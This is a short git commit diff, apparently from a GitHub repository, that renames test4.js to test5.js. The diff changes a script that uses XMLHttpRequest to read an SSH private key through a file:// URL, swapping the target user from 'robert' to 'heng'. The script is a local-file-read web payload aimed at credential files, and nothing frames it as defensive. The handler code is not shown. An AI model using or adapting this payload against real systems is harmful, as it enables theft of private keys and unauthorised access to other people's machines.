56fcbf746adb2c228123d0a62498d0c373bda0da
abdelali khalfi <38424164+abdelalikhalfi@users.noreply.github.com>
2024-06-22 19:33:20 +0100

    Update and rename test4.js to test5.js

--- test5.js
+++ test5.js
@@ -5,6 +5,6 @@ function reqListener() {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///robert/.ssh/id_rsa"); 
+oReq.open("GET", "file:///heng/.ssh/id_rsa"); 
 oReq.send();
 </script>
